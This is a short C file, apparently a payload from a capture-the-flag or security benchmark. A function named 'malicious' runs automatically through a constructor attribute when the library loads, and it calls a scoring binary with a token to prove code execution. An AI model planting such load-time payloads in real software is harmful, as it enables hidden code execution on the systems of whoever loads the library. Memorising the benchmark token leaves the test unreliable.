#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 33def109-c6dd-4517-b9c0-fb54a193faeb");
}
